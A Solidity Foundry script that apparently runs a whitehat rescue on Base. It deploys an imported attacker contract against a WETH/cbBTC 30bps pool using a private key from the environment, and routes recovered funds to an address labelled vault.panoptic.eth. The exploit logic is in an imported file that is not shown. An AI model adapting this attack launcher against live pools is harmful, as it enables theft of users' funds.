// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import {WETH_cbBTC30bpsBaseAttacker_Deployer, WETH_cbBTC30bpsBaseAttacker} from "./attacker-contracts/Deployable_WETH_cbBTC30bpsBase.sol";

contract ExecuteBaseWhitehatRound2 is Script {
    function run() public {
        uint256 DEPLOYER_PRIVATE_KEY = vm.envUint("DEPLOYER_PRIVATE_KEY");

        vm.startBroadcast(DEPLOYER_PRIVATE_KEY);

        // vault.panoptic.eth on base
        address withdrawer = 0x82BF455e9ebd6a541EF10b683dE1edCaf05cE7A1;

        console.log("Executing the only Base attack, on WETH_cbBTC30bps:");
        WETH_cbBTC30bpsBaseAttacker_Deployer wethCbBtc30bpsAttacker = new WETH_cbBTC30bpsBaseAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("WETH_cbBTC30bpsBaseAttacker_Deployer deployed at:", address(wethCbBtc30bpsAttacker));
        console.log("WETH_cbBTC30bpsBaseAttacker_Deployer succeeded");
        WETH_cbBTC30bpsBaseAttacker attacker = wethCbBtc30bpsAttacker.attacker();
        console.log("WETH_cbBTC30bpsBaseAttacker deployed and holding funds at:", address(attacker));

        vm.stopBroadcast();
    }
}
